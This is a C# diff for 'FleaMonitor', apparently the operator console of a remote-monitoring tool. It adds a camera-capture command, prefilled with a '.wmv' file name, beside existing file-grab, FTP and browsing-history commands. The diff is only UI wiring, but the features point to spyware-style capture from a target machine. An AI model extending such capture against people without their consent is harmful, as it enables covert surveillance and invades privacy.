@@ -20,7 +20,7 @@ namespace FleaMonitor
     /// </summary>
     public partial class MainWindow : Window
     {
-        private static readonly string FLEA_MONITOR_VERSION = "Flea Monitor v0.1";
+        private static readonly string FLEA_MONITOR_VERSION = "Flea Monitor v0.2";
 
         private readonly FleaInfo _fleaInfo = new();
         private readonly FleaFTPServer _fleaFTPServer = new();
@@ -41,6 +41,7 @@ namespace FleaMonitor
             { CommandProcessor.GETFILE_COMMAND, true },
             { CommandProcessor.SET_FTP_COMMAND, true },
             { CommandProcessor.BROWSING_HISTORY_COMMAND, false },
+            { CommandProcessor.GET_CAMERA_CAPTURE_COMMAND, true },
             { CommandProcessor.QUIT_COMMAND, false }
         };
 
@@ -59,6 +60,7 @@ namespace FleaMonitor
             { CommandProcessor.GETFILE_COMMAND, false },
             { CommandProcessor.SET_FTP_COMMAND, true },
             { CommandProcessor.BROWSING_HISTORY_COMMAND, false },
+            { CommandProcessor.GET_CAMERA_CAPTURE_COMMAND, false },
             { CommandProcessor.QUIT_COMMAND, true }
         };
 
@@ -91,6 +93,7 @@ namespace FleaMonitor
                 CommandProcessor.CD_COMMAND,
                 CommandProcessor.GETFILE_COMMAND,
                 CommandProcessor.BROWSING_HISTORY_COMMAND,
+                CommandProcessor.GET_CAMERA_CAPTURE_COMMAND,
                 CommandProcessor.QUIT_COMMAND
             };
         }
@@ -176,7 +179,7 @@ namespace FleaMonitor
             }
 
             var cmd = commandComboBox.SelectedItem.ToString();
-            var value = _commandWithParameterHash[cmd!] ? ReadParameter() : string.Empty;
+            var value = _commandWithParameterHash[cmd!] ? ReadParameter(cmd) : string.Empty;
 
             if (value == string.Empty && _commandWithParameterHash[cmd!])
             {
@@ -210,13 +213,19 @@ namespace FleaMonitor
             Close();
         }
 
-        private static string ReadParameter()
+        private static string ReadParameter(string? cmd)
         {
             //Open ValueWindow
             var valueWindow = new ValueWindow
             {
                 Owner = Application.Current.MainWindow
             };
+
+            if (cmd != null && cmd == CommandProcessor.GET_CAMERA_CAPTURE_COMMAND)
+            {
+                valueWindow.valueTextBox.Text = ".wmv";
+            }
+
             var result = valueWindow.ShowDialog();
             if (result.HasValue && result.Value)
             {
